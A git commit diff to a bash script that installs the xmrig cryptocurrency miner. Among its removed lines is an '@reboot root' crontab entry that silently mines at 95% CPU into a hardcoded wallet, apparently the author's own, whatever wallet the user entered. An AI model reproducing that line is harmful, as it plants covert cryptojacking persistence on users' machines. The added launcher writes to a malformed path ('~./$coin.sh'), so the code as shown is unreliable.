affcbf6c132d08105449f4687c1d465d612dc163
secrectvn <quoclong.hacker1412@gmail.com>
2018-01-21 23:08:12 +0700

    Update automining.sh

--- automining.sh
+++ automining.sh
@@ -8,15 +8,11 @@ mag=$'\e[1;35m'
 cyn=$'\e[1;36m'
 end=$'\e[0m'
 ####################################################
-echo -e "$blu Script auto mining by SecrectVN$end"
-echo -e "If so good you can $red donate $end"
-echo -e "$red INTS WALLET $red : iz4znrxGXvnLzSsdL5RdYtDMML8JZVFtkdiHX6ioxpEXhgsJMk5sy4pEUgan51chU3e6uSnvZc4FDjRVJB9ZbCUV1syXMriSf  "
-echo -e "$red FNO WALLET $red : 8xF6gw4VfP9dJWmyGcgjvpe3EjmbMFpzXaoV9RYZuaSWJdX2h6tRvxcC5ZvJi7Zek8DGozR2G5o2346axb1Mc7oU7Rqr1nn   "
-echo -e "$red AEON WALLET $red : Wmtj4bX83CqahEbSCjD3dmFf52Jh2RYgo7N6Fpmz4U539coLByWfU8u2fANUaFEtjeUYfbTNTrZa6hoDcJxTTCZp2GaLnAwvb   "
-echo -e "$red SUMO WALLET $red : Sumoo1UGTf5iK317a8ACZBNHAdQUFqRgAQzSCut3L5EiHr8tFGskUm3EFeBTkPP5Bwae8K23gh1TQjVGXMBTmbef4rByC13U7A3 "
-echo -e "$red SUMO WALLET $red : Sumoo1UGTf5iK317a8ACZBNHAdQUFqRgAQzSCut3L5EiHr8tFGskUm3EFeBTkPP5Bwae8K23gh1TQjVGXMBTmbef4rByC13U7A3 "
-echo -e "$red XLC WALLET $red : LtMig6TakmafkL6THtiN9TCB96yRhK3rUgsdsCPGqhoU6DvrwkU6fDgS9mbSqfmsYG3MG5nBH5SLXJMx3qLx8RAf1KSWaNk "
 
+echo -e  "$grn ######################################################### $end"
+echo -e  "$grn #       Auto mining install script by SecrectVN         # $end"
+echo -e  "$grn #        https://github.com/secrectvn/automining        # $end"
+echo -e  "$grn ######################################################### $end"
 # Menu
 echo -e "$grn Please pick coin you want  mining  :$end"
 
@@ -52,13 +48,15 @@ done
 echo -e  "$grn Input wallet address : $end"
 read wallet
 
+{
+echo "#!/bin/bash"
+echo " screen ./xmrig -o  pool.$coin.hashvault.pro:$port -u $wallet -p $(hostname) -k --max-cpu-usage=95 "
+} >> ~./$coin.sh ;
+
 #SCRIPT AUTO INSTALL MINING
 #!/bin/bash
 cd && sudo apt update && apt upgrade -y ;
 sudo apt-get install software-properties-common ;  	
 sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev htop screen -y ;
 sudo git clone https://github.com/xmrig/xmrig.git mining && mkdir -p ~/mining/build && cd ~/mining/build && cmake .. && make ;
-cd ~/mining/build/ && mv xmrig ~/ && cd ~/ ;
-
-echo "@reboot root screen /root/xmrig -o  pool.intense.hashvault.pro:8888 -u iz4znrxGXvnLzSsdL5RdYtDMML8JZVFtkdiHX6ioxpEXhgsJMk5sy4pEUgan51chU3e6uSnvZc4FDjRVJB9ZbCUV1syXMriSf -p $(hostname) -k --max-cpu-usage=95 --donate-level=1 " >> /etc/crontab ;
-
+cd ~/mining/build/ && mv xmrig ~/ && cd ~/ ; ./$coin.sh
